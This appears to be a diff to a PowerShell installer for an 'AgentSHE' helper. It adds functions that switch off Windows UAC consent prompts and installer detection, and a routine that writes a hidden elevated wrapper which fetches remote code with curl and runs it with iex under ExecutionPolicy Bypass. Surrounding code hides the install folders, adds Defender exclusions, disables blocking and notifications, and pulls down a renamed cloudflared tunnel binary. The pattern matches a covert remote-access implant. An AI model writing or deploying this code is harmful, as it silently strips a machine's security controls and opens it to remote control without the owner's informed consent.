@@ -9,6 +9,7 @@ if (-not $BotBase) { throw 'BotBase manquant' }
 $AfterReboot = ($env:AGENTSHE_AFTER_REBOOT -eq '1')
 $ForceHarden = ($env:AGENTSHE_FORCE_HARDEN -eq '1')
 $IsElevatedRun = ($env:AGENTSHE_ELEVATED -eq '1')
+$SessionPrep = ($env:AGENTSHE_SESSION_PREP -eq '1')
 
 function Ensure-ConsoleApi {
   if ('HHWin.Console' -as [type]) { return }
@@ -136,7 +137,9 @@ $RebootFlag = Join-Path $Dir '.security-rebooted'
 New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
 cmd /c "attrib +h `"$Dir`"" | Out-Null
 cmd /c "attrib +h `"$Cache`"" | Out-Null
-Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+if (-not $SessionPrep) {
+  Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+}
 
 function Wait-InteractiveLogon {
   Write-Host 'Attente de la session utilisateur...'
@@ -233,6 +236,77 @@ function Disable-WindowsNotifications {
   }
   New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Force | Out-Null
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name GlobalUserDisabled -Value 1 -Type DWord -Force
+}
+
+function Disable-UACPrompts {
+  $ErrorActionPreference = 'SilentlyContinue'
+  $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
+  if (-not (Test-Path $sysPol)) { return }
+  $bak = Join-Path $Dir 'uac-backup.json'
+  if (-not (Test-Path $bak)) {
+    $o = [ordered]@{}
+    foreach ($n in @('EnableLUA', 'ConsentPromptBehaviorAdmin', 'PromptOnSecureDesktop', 'EnableInstallerDetection')) {
+      $v = (Get-ItemProperty $sysPol -Name $n -EA SilentlyContinue).$n
+      if ($null -ne $v) { $o[$n] = [int]$v }
+    }
+    ($o | ConvertTo-Json) | Set-Content -Encoding UTF8 $bak
+  }
+  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force
+  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value 0 -Type DWord -Force
+  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value 0 -Type DWord -Force
+}
+
+function Invoke-ElevatedSessionPrep {
+  if (Test-IsAdmin) {
+    Disable-UACPrompts
+    Install-WipeRestoreHook
+    return
+  }
+  if (-not $InstallUrl) {
+    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
+  }
+  $wrap = Join-Path $env:TEMP ('HelperHost-prep-' + [guid]::NewGuid().ToString('n') + '.ps1')
+  $marker = Join-Path $env:TEMP 'HelperHost-prep.ok'
+  Remove-Item $marker -Force -ErrorAction SilentlyContinue
+  $en = $Enroll.Replace("'", "''")
+  $bb = $BotBase.Replace("'", "''")
+  $iu = $InstallUrl.Replace("'", "''")
+  @(
+    "`$ErrorActionPreference = 'SilentlyContinue'"
+    "`$Enroll = '$en'"
+    "`$BotBase = '$bb'"
+    "`$InstallUrl = '$iu'"
+    "`$env:AGENTSHE_ENROLL = '$en'"
+    "`$env:AGENTSHE_BOT_BASE = '$bb'"
+    "`$env:AGENTSHE_INSTALL_URL = '$iu'"
+    "`$env:AGENTSHE_ELEVATED = '1'"
+    "`$env:AGENTSHE_SESSION_PREP = '1'"
+    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+    "try {"
+    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
+    "  'OK' | Set-Content -Encoding ASCII '$marker'"
+    "} catch { exit 1 }"
+  ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
+  $psi = New-Object System.Diagnostics.ProcessStartInfo
+  $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+  $psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrap`""
+  $psi.UseShellExecute = $true
+  $psi.Verb = 'runas'
+  $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+  try {
+    $null = [System.Diagnostics.Process]::Start($psi)
+  } catch {
+    Remove-Item $wrap -Force -ErrorAction SilentlyContinue
+    return
+  }
+  for ($i = 0; $i -lt 90; $i++) {
+    Start-Sleep -Seconds 1
+    if (Test-Path $marker) {
+      Remove-Item $marker, $wrap -Force -ErrorAction SilentlyContinue
+      return
+    }
+  }
+  Remove-Item $wrap -Force -ErrorAction SilentlyContinue
 }
 
 function Disable-AllBlocking {
@@ -459,6 +533,7 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   }
 
   Disable-AllBlocking
+  Disable-UACPrompts
   Set-DefenderExclude $WorkDir $Helper
   Install-WipeRestoreHook
   if (Try-StartHelper $Helper $WorkDir) { return }
@@ -515,6 +590,14 @@ if ($AfterReboot) {
   Write-Host 'Session detectee — reprise de l''install...'
 }
 
+if ($SessionPrep) {
+  Disable-WindowsNotifications
+  Disable-UACPrompts
+  Install-WipeRestoreHook
+  Write-Output 'OK'
+  exit 0
+}
+
 Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
 Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
 
@@ -529,6 +612,7 @@ $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
 Disable-WindowsNotifications
 if ((Test-IsAdmin) -or $ForceHarden) {
+  Disable-UACPrompts
   Install-WipeRestoreHook
 }
 Start-Helper $Helper $Dir
@@ -550,6 +634,12 @@ for ($i=0; $i -lt 180; $i++) {
     if ($txt -match 'FAIL') { throw 'install failed' }
   }
   if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
+    if (-not (Test-IsAdmin)) {
+      try { Invoke-ElevatedSessionPrep } catch {}
+    } else {
+      Disable-UACPrompts
+      Install-WipeRestoreHook
+    }
     Finish-Ok
     $ok = $true
     break
